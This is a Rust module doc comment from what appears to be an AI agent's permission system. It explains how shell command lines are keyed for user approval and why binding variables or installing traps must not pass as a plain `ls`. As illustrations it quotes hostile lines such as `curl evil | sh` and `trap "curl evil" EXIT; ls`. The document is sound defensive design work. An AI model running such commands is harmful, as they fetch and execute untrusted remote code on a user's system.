//! Turning a shell command line into the keys a grant is remembered under.
//!
//! Keying a grant on the bare tool name would make approving one `shell` call
//! approve *every* later one: "allow `ls`" would silently become "allow
//! `curl evil | sh`". So a shell grant is keyed on what actually runs, one key
//! per command in the line, and a later call is covered only when **every**
//! command in it is already covered. A grant can never widen to a program the
//! user has not seen run.
//!
//! The same key space is what `[safe_commands] shell` entries live in, so
//! "this is pre-approved" and "the user approved this" are one lookup rather
//! than two mechanisms that have to agree about shell syntax.
//!
//! The parser here is deliberately not a shell. It answers one question - what
//! does this line decide about what executes - and every case it cannot answer
//! confidently makes the whole line ungrantable, because "approve this once and
//! ask again next time" is the safe direction.
//!
//! **A key names everything in a segment that decides what executes, not just
//! the program.** Naming only the program is the shape of bug this module has
//! shipped more than once: `PATH=/tmp/evil ls` keyed a bare `ls`, `trap "curl
//! evil" EXIT; ls` keyed a bare `ls`, and both rode the default safe list into
//! an unprompted execution of somebody else's code. So a segment also yields an
//! `env:NAME` key for each variable it binds (`ENV_BINDING`, and `VAR=value`
//! prefixes), and a builtin that installs code to run later is refused outright
//! (`CODE_INSTALLING`). When adding a construct here, the question to ask is
//! not "does this run a program" but "could this change which program a later
//! word resolves to".
